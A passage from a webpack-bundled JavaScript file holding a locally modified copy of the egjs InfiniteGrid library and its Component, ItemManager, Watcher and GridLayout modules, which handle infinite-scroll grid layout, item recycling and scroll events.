			fromRelayout = outline.length === cacheOutline.length ? !outline.every(function (v, index) {
				return v === cacheOutline[index];
			}) : true;

			if (!fromRelayout) {
				this._renderer.createAndInsert(items, isAppend);
				this._updateCursor(isAppend);
				this._onLayoutComplete(items, isAppend, isTrusted);
				return this;
			}
		}
		this._process(_consts.PROCESSING);
		var method = isAppend ? "append" : "prepend";

		fromCache && _DOMRenderer2["default"].createElements(items);
		this._renderer[method](items);

		// check image sizes after elements are attated on DOM
		// var type = this.options.isEqualSize && this._renderer._size.item ? _ImageLoaded.CHECK_ONLY_ERROR : _ImageLoaded.CHECK_ALL;
		// var prefix = this.options.attributePrefix;
		var replaceTarget = [];
		var removeTarget = [];
		var layouted = void 0;
		
		// console.time("infinite:complete");
		// _ImageLoaded2["default"].check(items.map(function (item) {
		// 	return item.el;
		// }), {
		// 	prefix: prefix,
		// 	type: type,
		// 	complete: function complete() {
			// requestAnimationFrame(() => {
				// console.time("infinite:layouted");
				layouted = _this4._layout[method](_this4._renderer.updateSize(items), _this4._items.getOutline(isAppend ? endCursor : startCursor, isAppend ? "end" : "start"));
				// console.timeEnd("infinite:layouted");
				// console.time("infinite:_postImageLoaded");
				_this4._postImageLoaded(fromCache, layouted, isAppend, isTrusted);
				// console.timeEnd("infinite:_postImageLoaded");
				// console.timeEnd("infinite:complete");
			// },
			// error: function error(_ref) {
			// 	var target = _ref.target,
			// 	    itemIndex = _ref.itemIndex;

			// 	var item = (layouted && layouted.items || items)[itemIndex];

			// 	_this4._onImageError(target, item, itemIndex, removeTarget, replaceTarget);
			// },
			// end: function end() {
				_this4._postImageLoadedEnd(layouted, isAppend, removeTarget, replaceTarget);
			// }
			// });
		// });
		return this;
	};

	InfiniteGrid.prototype._isVisible = function _isVisible(index) {
		var min = Math.min.apply(Math, this._items.getOutline(index, "start"));
		var max = Math.max.apply(Math, this._items.getOutline(index, "end"));
		var pos = this._watcher.getScrollPos();
		var viewSize = this._renderer.getViewSize();

        var $subFolderContainer = $("#sub-folder-container");
        var subFolderListHeight = ($subFolderContainer[0] && $subFolderContainer[0].clientHeight) || 0;

        pos = pos - subFolderListHeight;

		if (pos + viewSize + this.options.threshold < min - 1000) {
			return -1;
		} 
		else if (pos - this.options.threshold > max + 1000) {
			return 1;
		}
		return 0;
	};

	InfiniteGrid.prototype._updateCursor = function _updateCursor(isAppend) {
		if (this.options.useRecycle) {
			if (isAppend) {
				this._status.endCursor++;
			} else if (this._status.startCursor > 0) {
				this._status.startCursor--;
			} else {
				this._status.endCursor++; // outside prepend
			}
			if (this._status.startCursor < 0) {
				this._status.startCursor = 0;
			}
		} else {
			this._status.startCursor = 0;
			this._status.endCursor = this._items.size() - 1;
		}
	};

	InfiniteGrid.prototype._setItems = function _setItems(layouted) {
		var groupKey = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : layouted.items && layouted.items[0].groupKey || 0;

		layouted.groupKey = groupKey;
		this._items.set(layouted, groupKey);
	};

	InfiniteGrid.prototype._insertItems = function _insertItems(layouted, isAppend) {
		layouted.groupKey = layouted.items[0].groupKey;
		this._items[isAppend ? "append" : "prepend"](layouted);
	};
	// called by visible


	InfiniteGrid.prototype._requestAppend = function _requestAppend() {
		var items = this._getNextItems(_consts.APPEND);

		// if (this._isProcessing()) {
		// 	return;
		// }
		if (items.length) {
			this._postLayout(_consts.CACHE, items, _consts.APPEND, _consts.TRUSTED);
		} else {
			this.trigger("append", {
				isTrusted: true,
				groupKey: this.getGroupKeys().pop()
			});
		}
	};
	// called by visible


	InfiniteGrid.prototype._requestPrepend = function _requestPrepend() {
		var items = this._getNextItems(_consts.PREPEND);
		if (items.length) {
			this._postLayout(_consts.CACHE, items, _consts.PREPEND, _consts.TRUSTED);
		} else {
			this.trigger("prepend", {
				isTrusted: true,
				groupKey: this.getGroupKeys().shift()
			});
		}
		return items;
	};

	var InfiniteGridCheckTimeout;
	InfiniteGrid.prototype._onCheck = function _onCheck(_ref2) {
		var that = this;
		// clearTimeout(InfiniteGridCheckTimeout);
		// InfiniteGridCheckTimeout = setTimeout(function () {

			var isForward = _ref2.isForward,
			    scrollPos = _ref2.scrollPos,
			    horizontal = _ref2.horizontal,
			    orgScrollPos = _ref2.orgScrollPos;

			that.trigger("change", {
				isForward: isForward,
				horizontal: horizontal,
				scrollPos: scrollPos,
				orgScrollPos: orgScrollPos
			});

			var rect = that._getEdgeOffset(isForward ? "end" : "start");
			var isProcessing = that.isProcessing();
			if (!rect) {
				return;
			}
			var threshold = that.options.threshold;
			// var targetPos = isForward ? rect[horizontal ? "left" : "top"] - that._renderer.getViewSize() : rect[horizontal ? "right" : "bottom"];
			var targetPos = isForward ? rect["top"] - that._renderer.getViewSize() : rect["bottom"];

			if (isForward) {
				if (scrollPos + threshold >= targetPos) {
					that._requestAppend();
				}
			}
			else if (ig.getItems().length > 0) {
				var offset = $(ig.getItems()[0].el).offset();
				if (offset) {
					var targetPos = offset.top;
					if (targetPos + threshold / 2 > 0) {
						that._fit("before");
						that._requestPrepend();
					}
				}
			}
			else {
				var targetPos = ig._watcher.getScrollPos();
				if (targetPos + threshold / 2 > 0) {
					that._fit("before");
					that._requestPrepend();
				}
			}
		// }, 10);
	};

	InfiniteGrid.prototype._onLayoutComplete = function _onLayoutComplete(items, isAppend) {
		var isTrusted = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : false;
		var useRecycle = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : this.options.useRecycle;
		var isLayout = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : false;

		this._isLoading() && this._renderLoading();
		!isAppend && this._fit("after");
		if (useRecycle) {
			this._recycle(isAppend);
		}

		var size = this._getEdgeValue("end");

		// recycle after _fit beacause prepend and append are occured simultaneously by scroll.
		this._updateEdge();

		isAppend && this._renderer.setContainerSize(size + this._status.loadingSize || 0);
		!isLayout && this._process(_consts.PROCESSING, false);

		var scrollPos = this._watcher.getScrollPos();
		var viewSize = this._renderer.getViewSize();

		this.trigger("layoutComplete", {
			// target: items.concat(),
			target: items,
			isAppend: isAppend,
			isTrusted: isTrusted,
			isScroll: viewSize < this._renderer.getContainerOffset() + size,
			scrollPos: scrollPos,
			// orgScrollPos: this._watcher.getOrgScrollPos(),
			size: size
		});
		if (isLayout) {
			return;
		}
		var threshold = this.options.threshold;

		if (isAppend && Math.abs(size - viewSize - scrollPos) <= threshold) {
			this._requestAppend();
		} else if (!isAppend && scrollPos <= this._getEdgeValue("start") + threshold) {
			this._fit("before");
			this._requestPrepend();
		}
	};

	InfiniteGrid.prototype._updateContainerHeight = function _updateContainerHeight() {
		let boxListHeight = this._getEdgeValue("end");
		this._renderer.setContainerSize(boxListHeight);
	}

	InfiniteGrid.prototype._reset = function _reset() {
		this._status = {
			processingStatus: _consts.IDLE,
			loadingSize: 0,
			startCursor: -1,
			endCursor: -1,
			start: null,
			end: null
		};
	};

	InfiniteGrid.prototype.destroy = function destroy() {
		// Note: 移除先將 src 清空，強制瀏覽器清除緩存
		var items = ig._getItems();
		items.forEach(function (item) {
			if (item.el) {
				var $el = $(item.el);
				// $(item.el).find("img").attr("src" , "").css("display" , "none");
				$el.find("img").attr("src" , "");
				item.el.style.display = 'none';
				$el.find("*").off();
				$el.off();
				$el.remove();
				// DOMRenderer.removeElement(item.el);
				delete item.el;
			}
		});
		this.off();
		this._watcher.destroy();
		this._reset();
		this._items.clear();
		this._renderer.destroy();
	};

	return InfiniteGrid;
}(_component2["default"]);

InfiniteGrid.VERSION = "3.2.4";

exports["default"] = InfiniteGrid;
module.exports = exports["default"];

/***/ }),
/* 9 */
/***/ (function(module, exports, __webpack_require__) {

(function webpackUniversalModuleDefinition(root, factory) {
	if(true)
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["Component"] = factory();
	else
		root["eg"] = root["eg"] || {}, root["eg"]["Component"] = factory();
})(this, function() {
return /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var _Component = __webpack_require__(1);

var _Component2 = _interopRequireDefault(_Component);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }

_Component2["default"].VERSION = "2.1.0";
module.exports = _Component2["default"];

/***/ }),
/* 1 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var Component = function () {
	/**
  * @support {"ie": "7+", "ch" : "latest", "ff" : "latest",  "sf" : "latest", "edge" : "latest", "ios" : "7+", "an" : "2.1+ (except 3.x)"}
  */
	function Component() {
		_classCallCheck(this, Component);

		this._eventHandler = {};
		this.options = {};
	}

	Component.prototype.trigger = function trigger(eventName) {
		var customEvent = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

		var handlerList = this._eventHandler[eventName] || [];
		var hasHandlerList = handlerList.length > 0;

		if (!hasHandlerList) {
			return true;
		}

		// If detach method call in handler in first time then handeler list calls.
		handlerList = handlerList.concat();

		customEvent.eventType = eventName;

		var isCanceled = false;
		var arg = [customEvent];
		var i = 0;

		customEvent.stop = function () {
			isCanceled = true;
		};
		customEvent.currentTarget = this;

		for (var _len = arguments.length, restParam = Array(_len > 2 ? _len - 2 : 0), _key = 2; _key < _len; _key++) {
			restParam[_key - 2] = arguments[_key];
		}

		if (restParam.length >= 1) {
			arg = arg.concat(restParam);
		}

		for (i = 0; handlerList[i]; i++) {
			handlerList[i].apply(this, arg);
		}

		return !isCanceled;
	};

	Component.prototype.once = function once(eventName, handlerToAttach) {
		if ((typeof eventName === "undefined" ? "undefined" : _typeof(eventName)) === "object" && typeof handlerToAttach === "undefined") {
			var eventHash = eventName;
			var i = void 0;

			for (i in eventHash) {
				this.once(i, eventHash[i]);
			}
			return this;
		} else if (typeof eventName === "string" && typeof handlerToAttach === "function") {
			var self = this;

			this.on(eventName, function listener() {
				for (var _len2 = arguments.length, arg = Array(_len2), _key2 = 0; _key2 < _len2; _key2++) {
					arg[_key2] = arguments[_key2];
				}

				handlerToAttach.apply(self, arg);
				self.off(eventName, listener);
			});
		}

		return this;
	};

	Component.prototype.hasOn = function hasOn(eventName) {
		return !!this._eventHandler[eventName];
	};

	Component.prototype.on = function on(eventName, handlerToAttach) {
		if ((typeof eventName === "undefined" ? "undefined" : _typeof(eventName)) === "object" && typeof handlerToAttach === "undefined") {
			var eventHash = eventName;
			var name = void 0;

			for (name in eventHash) {
				this.on(name, eventHash[name]);
			}
			return this;
		} else if (typeof eventName === "string" && typeof handlerToAttach === "function") {
			var handlerList = this._eventHandler[eventName];

			if (typeof handlerList === "undefined") {
				this._eventHandler[eventName] = [];
				handlerList = this._eventHandler[eventName];
			}

			handlerList.push(handlerToAttach);
		}

		return this;
	};

	Component.prototype.off = function off(eventName, handlerToDetach) {
		// All event detach.
		if (typeof eventName === "undefined") {
			this._eventHandler = {};
			return this;
		}

		// All handler of specific event detach.
		if (typeof handlerToDetach === "undefined") {
			if (typeof eventName === "string") {
				this._eventHandler[eventName] = undefined;
				return this;
			} else {
				var eventHash = eventName;
				var name = void 0;

				for (name in eventHash) {
					this.off(name, eventHash[name]);
				}
				return this;
			}
		}

		// The handler of specific event detach.
		var handlerList = this._eventHandler[eventName];

		if (handlerList) {
			var k = void 0;
			var handlerFunction = void 0;

			for (k = 0; (handlerFunction = handlerList[k]) !== undefined; k++) {
				if (handlerFunction === handlerToDetach) {
					handlerList = handlerList.splice(k, 1);
					break;
				}
			}
		}

		return this;
	};

	return Component;
}();

exports["default"] = Component;
module.exports = exports["default"];

/***/ })
/******/ ]);
});
//# sourceMappingURL=component.js.map

/***/ }),
/* 10 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _consts = __webpack_require__(1);

var _DOMRenderer = __webpack_require__(4);

var _DOMRenderer2 = _interopRequireDefault(_DOMRenderer);

var _utils = __webpack_require__(0);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var ItemManager = function () {
	ItemManager.from = function from(elements, selector, _ref) {
		var groupKey = _ref.groupKey,
		    isAppend = _ref.isAppend;

		var filted = ItemManager.selectItems((0, _utils.$)(elements, _consts.MULTI), selector);

		// Item Structure
		return (0, _utils.toArray)(filted).map(function (el) {
			// var id = el.id.replace("box-", "");
			var id = el.getAttribute("data-box-id");
			return {
				id: id,
				el: el,
				groupKey: groupKey,
				// content: el.outerHTML
				content: NgGridStrings[id],
			};
		});
	};

	ItemManager.selectItems = function selectItems(elements) {
		var selector = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : "*";
		if (!elements) return [];
		return elements.filter(function (v) {
			var classNames = v.className.split(" ");

			if (classNames.some(function (c) {
				return c === _consts.IGNORE_CLASSNAME;
			})) {
				return false;
			} else if (!selector || selector === "*") {
				return v;
			} else {
				return classNames.some(function (c) {
					return c === selector;
				});
			}
		});
	};

	ItemManager.pluck = function pluck(data, property) {
		return data.reduce(function (acc, v) {
			return acc.concat(v[property]);
		}, []);
	};

	function ItemManager() {
		_classCallCheck(this, ItemManager);

		this.clear();
	}

	ItemManager.prototype.getStatus = function getStatus() {
		return {
			_data: this._data.map(function (data) {
				var items = data.items.map(function (item) {
					var item2 = _extends({}, item);

					delete item2.el;
					return item2;
				});
				var data2 = _extends({}, data);

				data2.items = items;
				return data2;
			})
		};
	};

	ItemManager.prototype.setStatus = function setStatus(status, start, end) {
		var data = status._data;

		for (var i = start; i <= end; i++) {
			data[i].items = _DOMRenderer2["default"].createElements(data[i].items);
		}
		this.set(data);
	};

	ItemManager.prototype.size = function size() {
		return this._data.length;
	};

	ItemManager.prototype.fit = function fit(base, isVertical) {
		if (!this._data.length) {
			return;
		}
		var property = isVertical ? "top" : "left";

		if (base !== 0) {
			this._data = this._data.map(function (v) {
				v.items = v.items.map(function (item) {
					item.rect[property] -= base;
					return item;
				});
				v.outlines.start = v.outlines.start.map(function (start) {
					return start - base;
				});
				v.outlines.end = v.outlines.end.map(function (end) {
					return end - base;
				});
				return v;
			});
		}
	};

	ItemManager.prototype.pluck = function pluck(property, start, end) {
		if (typeof start !== "undefined") {
			if (typeof end !== "undefined") {
				return ItemManager.pluck(this._data.slice(start, end + 1), property);
			} else {
				return ItemManager.pluck(this._data.slice(start, start + 1), property);
			}
		} else {
			return ItemManager.pluck(this._data, property);
		}
	};

	ItemManager.prototype.getOutline = function getOutline(index, property) {
		if (this._data.length && this._data[index]) {
			return this._data[index].outlines[property];
		} else {
			return [];
		}
	};

	ItemManager.prototype.getEdgeIndex = function getEdgeIndex(cursor, start, end) {
		var prop = cursor === "start" ? "min" : "max";
		var index = -1;
		var targetValue = cursor === "start" ? Infinity : -Infinity;

		for (var i = start; i <= end; i++) {
			var value = Math[prop].apply(Math, this.getOutline(i, cursor));

			if (cursor === "start" && targetValue > value || cursor === "end" && targetValue < value) {
				targetValue = value;
				index = i;
			}
		}
		return index;
	};

	ItemManager.prototype.getEdge = function getEdge(cursor, start, end) {
		var dataIdx = this.getEdgeIndex(cursor, start, end);
		var items = this.pluck("items", dataIdx);

		if (items.length) {
			var itemIdx = this.getOutline(dataIdx, cursor + "Index");

			return items.length > itemIdx ? items[itemIdx] : null;
		}
		return null;
	};

	ItemManager.prototype.getEdgeValue = function getEdgeValue(cursor, start, end) {
		var outlines = this.pluck("outlines", this.getEdgeIndex(cursor, start, end)).reduce(function (acc, v) {
			return acc.concat(v[cursor]);
		}, []);

		return outlines.length ? Math[cursor === "start" ? "min" : "max"].apply(Math, outlines) : 0;
	};

	ItemManager.prototype.append = function append(layouted) {
		this._data.push(layouted);
		return layouted.items;
	};

	ItemManager.prototype.prepend = function prepend(layouted) {
		this._data.unshift(layouted);
		return layouted.items;
	};

	ItemManager.prototype.clear = function clear() {
		this._data = [];
	};

	ItemManager.prototype.remove = function remove(element, start, end) {
		var items = null;
		var key = element.getAttribute(_consts.GROUPKEY_ATT);
		// var data = this.get(start, end).filter(function (v) {
		var data = this.get(start, ig._items._data.length).filter(function (v) {
			return String(v.groupKey) === key;
		});

		if (!data.length) {
			return items;
		}
		data = data[0];

		var len = data.items.length;
		var idx = -1;
		// var boxID = element.id.replace("box-", "");
		var boxID = element.getAttribute("data-box-id");

		for (var i = 0; i < len; i++) {
			if (boxID === data.items[i].id || data.items[i].el === element) {
				idx = i;
				break;
			}
		}
		if (~idx) {
			// remove item information
			data.items.splice(idx, 1);
			this.set(data, key);
			items = data.items;
		}
		return items;
	};

	// TODO: 塞入 item 到某个 item 之前
	ItemManager.prototype.moveElementsBefore = function moveElementsBefore(element, start, end, newElements, isAppend) {
		var items = null;
		var key = element.getAttribute(_consts.GROUPKEY_ATT);
		var data = this.get(start, end).filter(function (v) {
			return String(v.groupKey) === key;
		});

		if (!data.length) {
			return items;
		}
		data = data[0];

		var len = data.items.length;
		var idx = -1;

		for (var i = 0; i < len; i++) {
			if (data.items[i].el === element) {
				idx = i;
				break;
			}
		}
		if (idx > -1) {
			var targetElement = data.items[idx];
			if (isAppend) {
				idx += 1;
			}
			newElements.reverse().forEach(function (newElement) {
				if (!newElement) return;
				var $clone = $(newElement).clone();
				$clone.insertAfter(element);
				// var id = $clone[0].id.replace("box-", "");
				var id = $clone[0].getAttribute("data-box-id");
				var item = {
					id: id,
					el: $clone[0],
					groupKey: targetElement.groupKey,
					content: $clone[0].outerHTML,
				};
				data.items.splice(idx, 0, item);
			});
			this.set(data, key);
			items = data.items;
		}
		return items;
	};

	ItemManager.prototype.get = function get(start, end) {
		if (typeof start !== "undefined") {
			if (typeof end !== "undefined") {
				return this._data.slice(start, end + 1);
			} else {
				return this._data.slice(start, start + 1);
			}
		} else {
			return this._data.concat();
		}
	};

	ItemManager.prototype.set = function set(data, key) {
		if (typeof key !== "undefined" && !Array.isArray(data)) {
			var len = this._data.length;
			var idx = -1;

			for (var i = 0; i < len; i++) {
				if (this._data[i].groupKey === key) {
					idx = i;
					break;
				}
			}
			~idx && (this._data[idx] = data);
		} else {
			this._data = data.concat();
		}
	};

	return ItemManager;
}();

exports["default"] = ItemManager;
module.exports = exports["default"];

/***/ }),
/* 11 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _consts = __webpack_require__(1);

var _utils = __webpack_require__(0);

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var Watcher = function () {
	function Watcher(renderer, callback) {
		_classCallCheck(this, Watcher);

		_extends(this._callback = {
			layout: null,
			check: null
		}, callback);
		this._timer = {
			resize: null
			// doubleCheck: null,
			// doubleCheckCount: RETRY,
		};
		this.reset();
		this._renderer = renderer;
		this._onCheck = this._onCheck.bind(this);
		this._onResize = this._onResize.bind(this);
		this.attachEvent();
		// this.setScrollPos();
	}

	Watcher.prototype.getStatus = function getStatus() {
		return {
			_prevPos: this._prevPos,
			scrollPos: this.getOrgScrollPos()
		};
	};

	Watcher.prototype.setStatus = function setStatus(status) {
		var applyScrollPos = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : true;

		this._prevPos = status._prevPos;
		applyScrollPos && this.scrollTo(status.scrollPos);
	};

	Watcher.prototype.scrollTo = function scrollTo(pos) {
		var arrPos = this._renderer.options.isVertical ? [0, pos] : [pos, 0];

		_utils.scrollTo.apply(undefined, [this._renderer.view].concat(arrPos));
	};

	Watcher.prototype.getScrollPos = function getScrollPos() {
		return this._prevPos;
	};

	Watcher.prototype.setScrollPos = function setScrollPos(pos) {
		var rawPos = pos;

		if (typeof pos === "undefined") {
			rawPos = this.getOrgScrollPos();
		}
		// this._prevPos = rawPos - this._renderer.getContainerOffset();
		this._prevPos = rawPos;
		// console.log(this._renderer.getContainerOffset());
	};

	var watcherScrollTimeout;
	var watcherResizeTimeout;
	Watcher.prototype.attachEvent = function attachEvent() {
		var that = this;
		$(this._renderer.view).on("scroll", throttle(function () {
		// (0, _utils.addEvent)(this._renderer.view, "scroll", function () {
			// clearTimeout(watcherScrollTimeout);
			// watcherScrollTimeout = setTimeout(function () {
				that._onCheck();
			// }, 5);
		}, 50, true));
		(0, _utils.addEvent)(window, "resize", function () {
			clearTimeout(watcherResizeTimeout);
			watcherResizeTimeout = setTimeout(function () {
				that._onResize();
			}, 100);
		});
	};

	Watcher.prototype.getOrgScrollPos = function getOrgScrollPos() {
		return this._renderer.view.scrollTop;
	};

	Watcher.prototype.reset = function reset() {
		this._prevPos = null;
	};
	
	Watcher.prototype._onCheck = function _onCheck() {
		var that = this;
		clearTimeout(that.onCheckTimeout);
		that.onCheckTimeout = setTimeout(function () {
			if (!that.ticking) {
				requestAnimationFrame(() => {
					var prevPos = that.getScrollPos();
					var orgScrollPos = that.getOrgScrollPos();

					that.setScrollPos(orgScrollPos);
					var scrollPos = that.getScrollPos();


					// Note: 避免内容缩放后高度无法触及无法滚动
					if (prevPos === scrollPos) {
						scrollPos += 1;
					}
					// if (prevPos === null || _consts.IS_IOS && orgScrollPos === 0) {
					// if (prevPos === null || _consts.IS_IOS && orgScrollPos === 0 || prevPos === scrollPos) {
						// return;
					// }
					that._callback.check && that._callback.check({
						isForward: prevPos < scrollPos,
						scrollPos: scrollPos,
						orgScrollPos: orgScrollPos,
						horizontal: false
					});
					that.ticking = false;
				});
				that.ticking = true;
			}
		}, 10);
	};

	Watcher.prototype._onResize = function _onResize() {
		var _this = this;

		if (this._timer.resize) {
			clearTimeout(this._timer.resize);
		}
		this._timer.resize = setTimeout(function () {
			_this._renderer.isNeededResize() && _this._callback.layout && _this._callback.layout();
			_this._timer.resize = null;
			_this.reset();
		}, 300);
	};

	Watcher.prototype.detachEvent = function detachEvent() {
		(0, _utils.removeEvent)(window, "resize", this._onResize);
	};

	Watcher.prototype.destroy = function destroy() {
		this.detachEvent();
		this.reset();
	};

	return Watcher;
}();

exports["default"] = Watcher;
module.exports = exports["default"];

/***/ }),
/* 12 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _consts = __webpack_require__(1);

var _utils = __webpack_require__(0);

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

// ALIGN
var START = _consts.ALIGN.START,
    CENTER = _consts.ALIGN.CENTER,
    END = _consts.ALIGN.END,
    JUSTIFY = _consts.ALIGN.JUSTIFY;


var GridLayout = function () {
	function GridLayout() {
		var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

		_classCallCheck(this, GridLayout);

		this.options = (0, _utils.assignOptions)({
			align: START,
			itemSize: 0
		}, options);
		this._size = 0;
		this._columnSize = 0;
		this._columnLength = 0;
		this._style = (0, _utils.getStyleNames)(this.options.horizontal);
	}

	GridLayout.prototype.getPoints = function getPoints(outlines) {
		var pos = this.options.horizontal ? "left" : "top";

		return outlines.map(function (outline) {
			return outline[pos];
		});
	};

	GridLayout.prototype.checkColumn = function checkColumn(item) {
		var margin = this.options.margin;
		var sizeName = this.options.horizontal ? "height" : "width";
		var columnSize = this.options.itemSize || item && item.size[sizeName] || 0;

		this._columnSize = columnSize;
		if (!columnSize) {
			this._columnLength = 1;
			return;
		}
		this._columnLength = Math.max(parseInt((this._size + margin) / (columnSize + margin), 10), 1);
	};

	GridLayout.prototype._layout = function _layout(items, outline, isAppend) {
		var length = items.length;
		var margin = this.options.margin;
		var align = this.options.align;
		var style = this._style;

		var size1Name = style.size1;
		var size2Name = style.size2;
		var pos1Name = style.pos1;
		var pos2Name = style.pos2;
		var columnSize = this._columnSize;
		var columnLength = this._columnLength;

		var size = this._size;
		var viewDist = size - (columnSize + margin) * columnLength + margin;

		var pointCaculateName = isAppend ? "min" : "max";
		var startOutline = outline.slice();
		var endOutline = outline.slice();
		var startIndex = 0;
		var endIndex = -1;
		var endPos = -1;

		for (var i = 0; i < length; ++i) {
			var _item$rect;

			var point = Math[pointCaculateName].apply(Math, endOutline) || 0;
			var index = endOutline.indexOf(point);
			var item = items[isAppend ? i : length - 1 - i];
			var size1 = item.size[size1Name];
			var size2 = item.size[size2Name];
			var pos1 = isAppend ? point : point - margin - size1;
			var endPos1 = pos1 + size1 + margin;

			if (index === -1) {
				index = 0;
			}
			var pos2 = (columnSize + margin) * index;
			// Note: 这里会造成 prepend 模式 grid layout 顺序错乱，所以补上下面这行
			if (!isAppend) {
				pos2 = (columnSize + margin) * (endOutline.length - index - 1);
			}

			// ALIGN
			if (align === CENTER) {
				pos2 += viewDist / 2;
			} else if (align === END) {
				pos2 += viewDist + columnSize - size2;
			} else if (align === JUSTIFY) {
				if (columnLength <= 1) {
					pos2 += viewDist / 2;
				} else {
					pos2 = (size - columnSize) / (columnLength - 1) * index;
				}
			}
			// tetris
			item.rect = (_item$rect = {}, _item$rect[pos1Name] = pos1, _item$rect[pos2Name] = pos2, _item$rect);
			item.column = index;
			endOutline[index] = isAppend ? endPos1 : pos1;
			if (endIndex === -1) {
				endIndex = i;
				endPos = endPos1;
			} else if (endPos < endPos1) {
				endIndex = i;
				endPos = endPos1;
			}
		}
		if (!isAppend) {
			items.sort(function (a, b) {
				var item1pos1 = a.rect[pos1Name];
				var item1pos2 = a.rect[pos2Name];
				var item2pos1 = b.rect[pos1Name];
				var item2pos2 = b.rect[pos2Name];

				if (item1pos1 - item2pos1) {
					return item1pos1 - item2pos1;
				}
				return item1pos2 - item2pos2;
			});
			endIndex = length - 1;
		}
		// if append items, startOutline is low, endOutline is high
		// if prepend items, startOutline is high, endOutline is low
		return {
			start: isAppend ? startOutline : endOutline,
			end: isAppend ? endOutline : startOutline,
			startIndex: startIndex,
			endIndex: endIndex
		};
	};

	GridLayout.prototype._insert = function _insert() {
		var items = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
		var outline = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : [];
		var type = arguments[2];

		var clone = items.map(function (item) {
			return _extends({}, item);
		});

		var startOutline = outline;

		if (!this._columnLength) {
			this.checkColumn(items[0]);
		}
		if (outline.length !== this._columnLength) {
			startOutline = (0, _utils.fill)(new Array(this._columnLength), outline.length === 0 ? 0 : Math[type === _consts.APPEND ? "min" : "max"].apply(Math, outline) || 0);
		}

		var result = this._layout(clone, startOutline, type);

		return {
			items: clone,
			outlines: result
		};
	};

	GridLayout.prototype.append = function append(items, outline) {
		return this._insert(items, outline, _consts.APPEND);
	};

	GridLayout.prototype.prepend = function prepend(items, outline) {
		return this._insert(items, outline, _consts.PREPEND);
	};
	
	GridLayout.prototype.layout = function layout() {
		var _this = this;

		var groups = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
		var outline = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : [];

		// var firstItem = groups.length && groups[0].items.length && groups[0].items[0] || 0;
		// Fixed: by augus
		// 避免刪除圖片後，版行跑版
		var firstItem = ig.getItems()[0];

		this.checkColumn(firstItem);

